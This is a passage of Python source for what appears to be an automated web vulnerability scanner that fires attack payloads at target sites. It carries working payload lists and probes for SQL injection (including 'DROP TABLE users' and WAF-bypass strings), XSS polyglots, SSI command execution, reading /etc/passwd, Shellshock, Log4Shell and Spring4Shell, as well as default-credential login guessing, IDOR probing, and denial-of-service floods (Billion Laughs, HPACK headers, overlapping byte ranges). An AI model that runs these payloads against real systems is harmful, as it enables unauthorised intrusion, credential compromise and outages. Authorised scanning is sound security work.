                        findings.append({"type": f"Time-Based SQL Injection ({db})", "severity": "critical",
                                         "url": test_url, "detail": f"Param {p} caused {elapsed:.1f}s delay with {db} payload",
                                         "template": "apex-sqli-time"})
                        break
                except: continue
    return findings


def scan_rfi(crawl_data):
    """Remote File Inclusion — include external URLs as files."""
    findings = []
    test_url = "http://www.google.com/"
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if any(x in p.lower() for x in ["file", "page", "include", "path", "template", "load", "src", "url"]):
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [test_url]
                    test = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test, timeout=_TIMEOUT)
                    if "google" in r.text.lower() and "search" in r.text.lower():
                        findings.append({"type": "Remote File Inclusion (RFI)", "severity": "critical",
                                         "url": test, "detail": f"Param {p} includes remote URL content",
                                         "template": "apex-rfi"})
                        break
                except: continue
    return findings


def scan_ssi_injection(crawl_data):
    """Server-Side Include injection."""
    findings = []
    payloads = [
        ("<!--#exec cmd=\"id\"-->", ["uid=", "root", "www-data"]),
        ("<!--#echo var=\"DATE_LOCAL\"-->", ["monday","tuesday","wednesday","thursday","friday","saturday","sunday"]),
        ("<!--#include virtual=\"/etc/passwd\"-->", ["root:", "daemon:"]),
    ]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload, markers in payloads:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if any(m.lower() in r.text.lower() for m in markers) and payload not in r.text:
                        findings.append({"type": "Server-Side Include (SSI) Injection", "severity": "critical",
                                         "url": test_url, "detail": f"SSI executed via param {p}",
                                         "template": "apex-ssi"})
                        break
                except: continue
    return findings


def scan_shellshock(web_targets):
    """Test for ShellShock (CVE-2014-6271)."""
    findings = []
    payload = "() { :; }; echo Content-Type: text/plain; echo; echo 'SHELLSHOCK_TEST'"
    for target in web_targets[:5]:
        for path in ["/cgi-bin/test.cgi", "/cgi-bin/status", "/cgi-bin/printenv",
                     "/cgi-bin/test-cgi", "/cgi-bin/env.cgi"]:
            try:
                r = _S.get(f"{target}{path}", timeout=5,
                          headers={"User-Agent": payload, "Referer": payload, "Cookie": payload})
                if "SHELLSHOCK_TEST" in r.text:
                    findings.append({"type": "ShellShock (CVE-2014-6271)", "severity": "critical",
                                     "url": f"{target}{path}", "detail": "CGI script vulnerable to ShellShock",
                                     "template": "apex-shellshock"})
            except: continue
    return findings


def scan_log4shell(web_targets):
    """Test for Log4Shell (CVE-2021-44228) — uses DNS callback detection."""
    findings = []
    # Use a unique identifier to track callbacks
    import hashlib
    for target in web_targets[:10]:
        uid = hashlib.md5(target.encode()).hexdigest()[:8]
        # Use interactsh-style payload (requires DNS callback server)
        # Without OAST, we test for error-based detection
        payloads = [
            f"${{jndi:ldap://127.0.0.1:1389/{uid}}}",
            f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://127.0.0.1:1389/{uid}}}",
            f"${{jndi:dns://127.0.0.1/{uid}}}",
        ]
        for payload in payloads[:1]:
            try:
                headers = {
                    "User-Agent": payload, "X-Forwarded-For": payload,
                    "X-Api-Version": payload, "Referer": payload,
                    "X-Forwarded-Host": payload, "Accept-Language": payload,
                }
                r = _S.get(target, timeout=5, headers=headers)
                # Check for error responses that indicate JNDI processing
                if any(x in r.text for x in ["javax.naming", "JNDI", "ldap://", "NamingException"]):
                    findings.append({"type": "Log4Shell (CVE-2021-44228)", "severity": "critical",
                                     "url": target, "detail": "JNDI error in response — likely vulnerable",
                                     "template": "apex-log4shell"})
                    break
            except: continue
    return findings


def scan_spring4shell(web_targets):
    """Test for Spring4Shell (CVE-2022-22965)."""
    findings = []
    payload = "class.module.classLoader.DefaultAssertionStatus=nonsense"
    safe_payload = "class.module.classLoader.DefaultAssertionStatus=safe"
    for target in web_targets[:5]:
        try:
            r_vuln = _S.post(target, data=payload, timeout=5,
                            headers={"Content-Type": "application/x-www-form-urlencoded"})
            r_safe = _S.post(target, data=safe_payload, timeout=5,
                            headers={"Content-Type": "application/x-www-form-urlencoded"})
            if r_vuln.status_code == 400 and r_safe.status_code != 400:
                findings.append({"type": "Spring4Shell (CVE-2022-22965)", "severity": "critical",
                                 "url": target, "detail": "Spring Framework RCE vulnerability detected",
                                 "template": "apex-spring4shell"})
        except: continue
    return findings


def scan_xslt_injection(crawl_data):
    """Test for XSLT injection."""
    findings = []
    payloads = [
        ("<xsl:value-of select=\"system-property('xsl:version')\"/>", ["1.0", "2.0", "3.0"]),
        ("<xsl:value-of select=\"system-property('xsl:vendor')\"/>", ["saxon", "xalan", "libxslt", "microsoft"]),
    ]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload, markers in payloads:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if any(m.lower() in r.text.lower() for m in markers) and "<xsl:" not in r.text:
                        findings.append({"type": "XSLT Injection", "severity": "high",
                                         "url": test_url, "detail": f"XSLT executed via param {p}",
                                         "template": "apex-xslt"})
                        break
                except: continue
    return findings


def scan_xpath_injection(crawl_data):
    """Test for XPath injection."""
    findings = []
    payloads = [
        ("' or '1'='1", ["welcome", "admin", "user", "success", "true"]),
        ("' or 1=1 or ''='", ["welcome", "admin", "user", "success"]),
        ("x' or name()='username' or 'x'='y", ["username", "password", "user"]),
    ]
    error_markers = ["xpath", "xpathexception", "javax.xml.xpath", "xmlexception",
                     "invalid xpath", "xpath error", "unterminated string"]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload, success_markers in payloads:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if any(m.lower() in r.text.lower() for m in error_markers):
                        findings.append({"type": "XPath Injection (Error-Based)", "severity": "high",
                                         "url": test_url, "detail": f"XPath error via param {p}",
                                         "template": "apex-xpath"})
                        break
                except: continue
    return findings


def scan_user_agent_fuzzing(web_targets):
    """Fuzz User-Agent to find different responses (mobile sites, admin access)."""
    findings = []
    agents = [
        ("Googlebot", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"),
        ("Mobile", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"),
        ("curl", "curl/7.68.0"),
        ("Python", "python-requests/2.25.1"),
        ("Empty", ""),
        ("SQLMap", "sqlmap/1.0-dev"),
        ("Nikto", "Mozilla/5.00 (Nikto/2.1.6)"),
    ]
    for target in web_targets[:3]:
        try:
            baseline = _S.get(target, timeout=5)
            baseline_hash = hash(baseline.text[:500])
            for name, ua in agents:
                r = _S.get(target, timeout=5, headers={"User-Agent": ua})
                if hash(r.text[:500]) != baseline_hash and abs(len(r.text) - len(baseline.text)) > 200:
                    findings.append({"type": f"Different Response for User-Agent: {name}", "severity": "low",
                                     "url": target, "detail": f"UA '{name}' returns different content",
                                     "template": "apex-ua"})
        except: pass
    return findings


def scan_billion_laughs(web_targets):
    """Test for Billion Laughs (XML entity expansion DoS)."""
    findings = []
    payload = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>"""
    for target in web_targets[:3]:
        for path in ["/api/xml", "/api/import", "/api/parse", "/upload", "/api/v1/xml"]:
            try:
                r = _S.post(f"{target}{path}", data=payload,
                           headers={"Content-Type": "application/xml"}, timeout=3)
                if r.status_code in (200, 500) and "lol" not in r.text:
                    findings.append({"type": "Billion Laughs (XML Entity Expansion)", "severity": "medium",
                                     "url": f"{target}{path}", "detail": "XML endpoint may be vulnerable to entity expansion DoS",
                                     "template": "apex-billionlaughs"})
            except requests.exceptions.Timeout:
                findings.append({"type": "Billion Laughs DoS (Timeout)", "severity": "high",
                                 "url": f"{target}{path}", "detail": "XML entity expansion caused timeout",
                                 "template": "apex-billionlaughs"})
            except: continue
    return findings


# ---------------------------------------------------------------------------
# Headless browser scanning — DOM XSS, SPA crawl, JS-rendered content
# ---------------------------------------------------------------------------

def scan_with_browser(target, crawl_data):
    """Use headless Chromium to find DOM XSS and JS-rendered vulnerabilities."""
    findings = []
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        return findings

    xss_payloads = [
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "'><script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "{{7*7}}",  # Also catches SSTI in JS frameworks
    ]

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True, args=["--no-sandbox","--disable-dev-shm-usage"])
            context = browser.new_context(ignore_https_errors=True)
            page = context.new_page()

            # Intercept alerts — if alert fires, XSS confirmed
            alerts_fired = []
            page.on("dialog", lambda d: (alerts_fired.append(d.message), d.dismiss()))

            # Collect JS errors and network requests
            js_errors = []
            api_calls = []
            page.on("pageerror", lambda e: js_errors.append(str(e)))
            page.on("request", lambda r: api_calls.append(r.url) if "/api/" in r.url else None)

            # Load the target
            try:
                page.goto(target, timeout=15000, wait_until="networkidle")
            except Exception:
                try:
                    page.goto(target, timeout=10000)
                except Exception:
                    browser.close()
                    return findings

            # Collect all links and forms from JS-rendered page
            js_links = page.evaluate("""() => {
                return Array.from(document.querySelectorAll('a[href]'))
                    .map(a => a.href)
                    .filter(h => h.startsWith('http') || h.startsWith('/'));
            }""")

            js_forms = page.evaluate("""() => {
                return Array.from(document.querySelectorAll('form')).map(f => ({
                    action: f.action,
                    method: f.method,
                    inputs: Array.from(f.querySelectorAll('input,textarea,select')).map(i => ({
                        name: i.name, type: i.type, value: i.value
                    }))
                }));
            }""")

            # Report new API calls found via JS
            for api_url in api_calls[:10]:
                if api_url not in [p["url"] for p in crawl_data.get("pages", [])]:
                    findings.append({"type": "JS-Discovered API Endpoint", "severity": "low",
                                     "url": api_url, "detail": "API call found via browser JS execution",
                                     "template": "apex-browser"})

            # Test DOM XSS via URL fragment
            for payload in xss_payloads[:3]:
                try:
                    alerts_fired.clear()
                    page.goto(f"{target}#{payload}", timeout=8000)
                    page.wait_for_timeout(1000)
                    if alerts_fired:
                        findings.append({"type": "DOM XSS (Fragment)", "severity": "critical",
                                         "url": f"{target}#{payload}",
                                         "detail": f"Alert fired: {alerts_fired[0]}",
                                         "template": "apex-domxss"})
                        break
                except Exception:
                    pass

            # Test DOM XSS via URL params
            for url, params in crawl_data.get("params", {}).items():
                for p in list(params)[:3]:
                    for payload in xss_payloads[:2]:
                        try:
                            alerts_fired.clear()
                            parsed = urllib.parse.urlparse(url)
                            qs = urllib.parse.parse_qs(parsed.query)
                            qs[p] = [payload]
                            test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                            page.goto(test_url, timeout=8000)
                            page.wait_for_timeout(500)
                            if alerts_fired:
                                findings.append({"type": "DOM XSS (Param)", "severity": "critical",
                                                 "url": test_url,
                                                 "detail": f"Alert fired via param {p}: {alerts_fired[0]}",
                                                 "template": "apex-domxss"})
                                break
                        except Exception:
                            continue

            # Check for sensitive data in JS variables
            sensitive_js = page.evaluate("""() => {
                const results = [];
                const patterns = [
                    /(?:api[_-]?key|apikey|secret|token|password|passwd|auth)['"\\s]*[:=]['"\\s]*(['"\\w\\-\\.]{8,})/gi,
                    /AKIA[0-9A-Z]{16}/g,
                    /eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+/g,
                ];
                const scripts = Array.from(document.querySelectorAll('script:not([src])'));
                for (const s of scripts) {
                    for (const p of patterns) {
                        const matches = s.textContent.match(p);
                        if (matches) results.push(...matches.slice(0, 3));
                    }
                }
                return results;
            }""")

            for secret in sensitive_js[:5]:
                findings.append({"type": "Secret in Inline JS", "severity": "critical",
                                 "url": target, "detail": f"Found in page JS: {secret[:60]}",
                                 "template": "apex-browser-secret"})

            browser.close()
    except Exception:
        pass

    return findings


# ---------------------------------------------------------------------------
# Auth-aware scanning + deep payload sets (beats ZAP's payload depth)
# ---------------------------------------------------------------------------

# Deep SQLi payloads — more than ZAP's default set
SQLI_PAYLOADS = [
    # Error-based
    "'", "''", "`", "``", ",", '"', '""', "/", "//", "\\", "//\\",
    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
    "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    "') OR ('1'='1", "') OR ('1'='1'--",
    "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
    "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
    "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--",
    # Boolean-based
    "' AND 1=1--", "' AND 1=2--",
    "' AND 'x'='x", "' AND 'x'='y",
    "1 AND 1=1", "1 AND 1=2",
    # Stacked queries
    "'; DROP TABLE users--", "'; SELECT 1--",
    "1; SELECT SLEEP(0)--",
    # Second-order
    "admin'--", "admin'#", "admin'/*",
    # NoSQL
    "' || '1'=='1", "' || 1==1//", "' || 1==1%00",
    # WAF bypass
    "' /*!OR*/ '1'='1", "' %09OR%09'1'='1",
    "' OORR '1'='1", "' OR/**/1=1--",
    "1' AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
]

# Deep XSS payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "';alert(1)//",
    "\";alert(1)//",
    "</script><script>alert(1)</script>",
    "<img src=\"x\" onerror=\"alert(1)\">",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<%2Fscript><script>alert(1)<%2Fscript>",
    "<svg><script>alert(1)</script></svg>",
    "<math><mtext></mtext><mglyph><svg><mtext></mtext><path id=\"</path><script>alert(1)</script>\">",
    # Polyglots
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    # DOM-based
    "#<img src=x onerror=alert(1)>",
    "?x=<script>alert(1)</script>",
]


def scan_deep_sqli(crawl_data):
    """Deep SQL injection with full payload set — beats ZAP's default."""
    findings = []
    error_patterns = [
        "sql syntax", "mysql_fetch", "ora-", "postgresql", "sqlite",
        "syntax error", "unclosed quotation", "quoted string not properly terminated",
        "microsoft ole db", "odbc drivers", "jdbc", "sqlexception",
        "you have an error in your sql", "warning: mysql", "pg_query",
        "supplied argument is not a valid mysql", "invalid query",
        "division by zero", "column count doesn't match",
    ]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload in SQLI_PAYLOADS:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    body = r.text.lower()
                    if any(e in body for e in error_patterns):
                        findings.append({"type": "SQL Injection (Error-Based)", "severity": "critical",
                                         "url": test_url, "detail": f"SQL error via param {p}: {payload[:40]}",
                                         "template": "apex-sqli"})
                        break
                    # Boolean-based: compare response lengths
                    if "AND 1=1" in payload:
                        qs[p] = [payload.replace("1=1", "1=2")]
                        false_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                        r2 = _S.get(false_url, timeout=_TIMEOUT)
                        if abs(len(r.text) - len(r2.text)) > 50:
                            findings.append({"type": "SQL Injection (Boolean-Based)", "severity": "critical",
                                             "url": test_url, "detail": f"Boolean SQLi via param {p}",
                                             "template": "apex-sqli"})
                            break
                except: continue
    return findings


def scan_deep_xss(crawl_data):
    """Deep XSS with full payload set including polyglots."""
    findings = []
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload in XSS_PAYLOADS:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    # Check if payload is reflected unencoded
                    if payload in r.text and r.headers.get("content-type","").startswith("text/html"):
                        findings.append({"type": "Reflected XSS", "severity": "high",
                                         "url": test_url, "detail": f"XSS via param {p}: {payload[:50]}",
                                         "template": "apex-xss-deep"})
                        break
                except: continue
    # Test forms
    for form in crawl_data.get("forms", []):
        action = form.get("action", "")
        if not action: continue
        for inp in form.get("inputs", []):
            if inp.get("type") in ("submit", "hidden", "button"): continue
            for payload in XSS_PAYLOADS[:5]:
                try:
                    data = {i.get("name","f"): i.get("value","test") for i in form.get("inputs",[])}
                    data[inp.get("name","x")] = payload
                    r = _S.post(action, data=data, timeout=_TIMEOUT)
                    if payload in r.text and "text/html" in r.headers.get("content-type",""):
                        findings.append({"type": "Reflected XSS (Form)", "severity": "high",
                                         "url": action, "detail": f"XSS in form field {inp.get('name')}",
                                         "template": "apex-xss-deep"})
                        break
                except: continue
    return findings


def scan_auth_bypass(crawl_data):
    """Test authentication bypass with common credential attacks."""
    findings = []
    default_creds = [
        ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
        ("admin", "admin123"), ("root", "root"), ("root", "toor"),
        ("administrator", "administrator"), ("test", "test"),
        ("guest", "guest"), ("user", "user"), ("admin", ""),
        ("", ""), ("admin", "1234"), ("admin", "pass"),
    ]
    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        for path in ["/login", "/admin", "/api/login", "/auth/login", "/signin"]:
            url = f"{base}{path}"
            try:
                # Check if login page exists
                r = _S.get(url, timeout=5)
                if r.status_code not in (200, 302): continue
                for user, pwd in default_creds[:8]:
                    for payload in [
                        {"username": user, "password": pwd},
                        {"email": f"{user}@admin.com", "password": pwd},
                        {"user": user, "pass": pwd},
                        {"login": user, "password": pwd},
                    ]:
                        try:
                            r = _S.post(url, json=payload, timeout=5, allow_redirects=True)
                            body = r.text.lower()
                            if (r.status_code == 200 and
                                any(x in body for x in ["dashboard","welcome","logout","profile","account"]) and
                                not any(x in body for x in ["invalid","incorrect","failed","error","wrong"])):
                                findings.append({"type": "Default Credentials", "severity": "critical",
                                                 "url": url, "detail": f"Login with {user}:{pwd}",
                                                 "template": "apex-auth-bypass"})
                                break
                        except: continue
            except: continue
    return findings


# ---------------------------------------------------------------------------
# Authenticated scanning + AJAX/SPA spider (beats ZAP's last advantages)
# ---------------------------------------------------------------------------

def authenticated_scan(target, username, password, crawl_data):
    """Log in and scan authenticated pages — ZAP's main advantage."""
    findings = []
    base = "/".join(target.split("/", 3)[:3])

    # Try to find and use login form
    session = requests.Session()
    session.verify = False
    session.headers.update({"User-Agent": "ApexCLI/5.0"})

    login_paths = ["/login", "/signin", "/auth/login", "/api/login",
                   "/api/auth", "/api/v1/login", "/user/login", "/account/login"]

    logged_in = False
    for path in login_paths:
        login_url = f"{base}{path}"
        try:
            r = session.get(login_url, timeout=5)
            if r.status_code != 200: continue

            # Try JSON login
            for payload in [
                {"username": username, "password": password},
                {"email": username, "password": password},
                {"user": username, "pass": password},
                {"login": username, "password": password},
            ]:
                r = session.post(login_url, json=payload, timeout=5)
                body = r.text.lower()
                if (r.status_code in (200, 302) and
                    any(x in body for x in ["dashboard","welcome","logout","profile","token","success"]) and
                    not any(x in body for x in ["invalid","incorrect","failed","error","wrong"])):
                    logged_in = True
                    break

            if not logged_in:
                # Try form-based login
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(r.text, "lxml")
                form = soup.find("form")
                if form:
                    data = {}
                    for inp in form.find_all("input"):
                        name = inp.get("name", "")
                        if not name: continue
                        if any(x in name.lower() for x in ["user", "email", "login"]): data[name] = username
                        elif any(x in name.lower() for x in ["pass", "pwd"]): data[name] = password
                        else: data[name] = inp.get("value", "")
                    action = form.get("action", login_url)
                    if not action.startswith("http"): action = base + action
                    r = session.post(action, data=data, timeout=5)
                    if r.status_code in (200, 302):
                        logged_in = True

            if logged_in:
                break
        except: continue

    if not logged_in:
        return findings

    # Now scan authenticated pages
    auth_paths = ["/dashboard", "/admin", "/profile", "/settings", "/account",
                  "/api/users", "/api/me", "/api/profile", "/api/admin",
                  "/api/v1/users", "/api/v1/me", "/user/settings"]

    for path in auth_paths:
        try:
            r = session.get(f"{base}{path}", timeout=5)
            if r.status_code == 200:
                body = r.text.lower()
                # Check for sensitive data in authenticated pages
                if any(x in body for x in ["password", "secret", "api_key", "token", "ssn", "credit"]):
                    findings.append({"type": "Sensitive Data in Authenticated Page", "severity": "high",
                                     "url": f"{base}{path}", "detail": "Authenticated page exposes sensitive data",
                                     "template": "apex-auth-scan"})
                # Check for IDOR — try accessing other users' data
                if any(x in path for x in ["/users", "/profile", "/account"]):
                    for uid in ["1", "2", "3", "admin", "0"]:
                        try:
                            r2 = session.get(f"{base}{path}/{uid}", timeout=3)
                            if r2.status_code == 200 and len(r2.content) > 100:
                                findings.append({"type": "IDOR (Authenticated)", "severity": "critical",
                                                 "url": f"{base}{path}/{uid}",
                                                 "detail": f"Accessed user {uid} data while authenticated as {username}",
                                                 "template": "apex-idor-auth"})
                        except: pass
        except: continue

    return findings


def ajax_spider(target, max_pages=100):
    """AJAX/SPA spider using headless browser — finds JS-rendered links ZAP finds."""
    pages = []
    forms = []
    api_calls = []

    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True, args=["--no-sandbox","--disable-dev-shm-usage"])
            context = browser.new_context(ignore_https_errors=True)
            page = context.new_page()

            visited = set()
            to_visit = [target]
            base = "/".join(target.split("/", 3)[:3])

            # Intercept all network requests
            page.on("request", lambda r: api_calls.append({
                "url": r.url, "method": r.method,
                "post_data": r.post_data or ""
            }) if r.resource_type in ("fetch", "xhr") else None)

            while to_visit and len(visited) < max_pages:
                url = to_visit.pop(0)
                if url in visited: continue
                visited.add(url)

                try:
                    page.goto(url, timeout=10000, wait_until="networkidle")
                    page.wait_for_timeout(1000)

                    # Get all links including JS-rendered ones
                    links = page.evaluate("""() => {
                        return Array.from(document.querySelectorAll('a[href]'))
                            .map(a => a.href)
                            .filter(h => h.startsWith('http'));
                    }""")

                    # Get all forms
                    page_forms = page.evaluate("""() => {
                        return Array.from(document.querySelectorAll('form')).map(f => ({
                            action: f.action || window.location.href,
                            method: f.method || 'GET',
                            inputs: Array.from(f.querySelectorAll('input,textarea,select')).map(i => ({
                                name: i.name, type: i.type, value: i.value
                            }))
                        }));
                    }""")

                    pages.append({"url": url, "status": 200, "length": len(page.content())})
                    forms.extend(page_forms)

                    for link in links:
                        if link.startswith(base) and link not in visited:
                            to_visit.append(link)

                except Exception:
                    pass

            browser.close()
    except Exception:
        pass

    return {"pages": pages, "forms": forms, "api_calls": api_calls,
            "params": {p["url"]: set(urllib.parse.parse_qs(urllib.parse.urlparse(p["url"]).query).keys())
                       for p in pages if "?" in p["url"]},
            "links": [p["url"] for p in pages]}


# ---------------------------------------------------------------------------
# First-in-world: HTTP/2 attacks, TRACE, OPTIONS, Range, ETag, token races
# ---------------------------------------------------------------------------

def scan_http2_attacks(web_targets):
    """HTTP/2 specific attacks — HPACK bomb, pseudo-header confusion, stream abuse."""
    findings = []
    try:
        import httpx
    except ImportError:
        try:
            import subprocess, sys
            subprocess.run([sys.executable, "-m", "pip", "install", "--break-system-packages", "httpx[http2]"],
                          capture_output=True)
            import httpx
        except: return findings

    for target in web_targets[:5]:
        try:
            with httpx.Client(http2=True, verify=False, timeout=10) as client:
                # Test if HTTP/2 is supported
                r = client.get(target)
                if r.http_version != "HTTP/2": continue

                # HPACK bomb — send many large headers to exhaust header table
                big_headers = {f"X-Fuzz-{i}": "A" * 100 for i in range(50)}
                try:
                    r2 = client.get(target, headers=big_headers, timeout=5)
                    findings.append({"type": "HTTP/2 Supported (HPACK bomb test)", "severity": "low",
                                     "url": target, "detail": f"HTTP/2 active, sent 50 large headers, status: {r2.status_code}",
                                     "template": "apex-h2"})
                except Exception as e:
                    if "timeout" in str(e).lower() or "reset" in str(e).lower():
                        findings.append({"type": "HTTP/2 HPACK Bomb (DoS)", "severity": "high",
                                         "url": target, "detail": "Server reset/timeout on large header flood",
                                         "template": "apex-h2"})

                # Pseudo-header confusion — :authority vs Host mismatch
                try:
                    r3 = client.get(target, headers={"host": "evil.com"})
                    if r3.status_code == 200 and "evil.com" in r3.text:
                        findings.append({"type": "HTTP/2 Authority/Host Mismatch", "severity": "high",
                                         "url": target, "detail": "Server reflects injected Host header in HTTP/2",
                                         "template": "apex-h2"})
                except: pass

        except Exception: continue
    return findings


def scan_trace_options(web_targets):
    """TRACE method exploitation + OPTIONS method abuse."""
    findings = []
    for target in web_targets[:5]:
        # TRACE — can leak auth headers via XST (Cross-Site Tracing)
        try:
            r = requests.request("TRACE", target, timeout=5, verify=False,
                                headers={"X-Custom-Header": "apex-trace-test"})
            if r.status_code == 200 and "apex-trace-test" in r.text:
                findings.append({"type": "TRACE Method Enabled (XST Risk)", "severity": "medium",
                                 "url": target, "detail": "TRACE reflects request headers — XST attack possible",
                                 "template": "apex-trace"})
        except: pass

        # OPTIONS — reveals allowed methods
        try:
            r = _S.options(target, timeout=5)
            allow = r.headers.get("Allow", r.headers.get("Access-Control-Allow-Methods", ""))
            if allow:
                dangerous = [m for m in ["PUT","DELETE","PATCH","CONNECT","TRACE"] if m in allow.upper()]
                if dangerous:
                    findings.append({"type": f"Dangerous HTTP Methods Allowed: {', '.join(dangerous)}",
                                     "severity": "medium", "url": target,
                                     "detail": f"Allow: {allow}", "template": "apex-options"})
        except: pass
    return findings


def scan_range_amplification(web_targets):
    """Range request amplification — DoS via overlapping byte ranges."""
    findings = []
    for target in web_targets[:3]:
        try:
            # First get content length
            r = _S.head(target, timeout=5)
            cl = int(r.headers.get("Content-Length", 0))
            if cl < 100: continue

            # Test if range requests are supported
            r2 = _S.get(target, timeout=5, headers={"Range": "bytes=0-10"})
            if r2.status_code != 206: continue

            # Test overlapping ranges (amplification)
            ranges = ",".join([f"0-{cl}" for _ in range(20)])
            start = time.time()
            r3 = requests.get(target, timeout=10, verify=False, headers={"Range": f"bytes={ranges}"})
            elapsed = time.time() - start

            if r3.status_code == 206 and len(r3.content) > cl * 5:
                findings.append({"type": "Range Request Amplification", "severity": "medium",
                                 "url": target, "detail": f"20 overlapping ranges returned {len(r3.content)}b (original: {cl}b)",
                                 "template": "apex-range"})
            elif elapsed > 5:
                findings.append({"type": "Range Request DoS (Slow Response)", "severity": "medium",
                                 "url": target, "detail": f"Overlapping ranges caused {elapsed:.1f}s delay",
                                 "template": "apex-range"})
        except: continue
    return findings


def scan_etag_tracking(crawl_data):
    """Check if ETags leak session/user info (privacy issue)."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:10]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            r1 = _S.get(page["url"], timeout=5)
            etag1 = r1.headers.get("ETag", "")
            if not etag1: continue

            # Check if ETag changes per session (leaks session info)
            r2 = requests.get(page["url"], timeout=5, verify=False)  # Different session
            etag2 = r2.headers.get("ETag", "")

            if etag1 and etag2 and etag1 != etag2:
                findings.append({"type": "ETag Session Tracking", "severity": "low",
                                 "url": page["url"], "detail": f"ETag differs per session — may track users",
                                 "template": "apex-etag"})

            # Check if ETag contains sensitive info (inode, file path)
            if re.search(r'[0-9a-f]{8,}-[0-9a-f]+', etag1):
                findings.append({"type": "ETag Leaks File Metadata", "severity": "low",
                                 "url": page["url"], "detail": f"ETag format suggests inode/size leak: {etag1[:30]}",
                                 "template": "apex-etag"})
        except: pass
    return findings


def scan_token_race_conditions(crawl_data):
    """Test for race conditions in token/session operations."""
    findings = []
    import concurrent.futures

    for page in crawl_data.get("pages", []):
        url = page["url"]
        if not any(x in url.lower() for x in ["register", "signup", "reset", "verify", "confirm", "redeem", "coupon"]):
            continue

        # Send 10 identical requests simultaneously
        def make_request(u):
            try:
                return _S.post(u, json={"email": "race@test.com", "code": "123456"}, timeout=5)
            except: return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
            futures = [pool.submit(make_request, url) for _ in range(10)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]

        success_count = sum(1 for r in results if r and r.status_code == 200 and
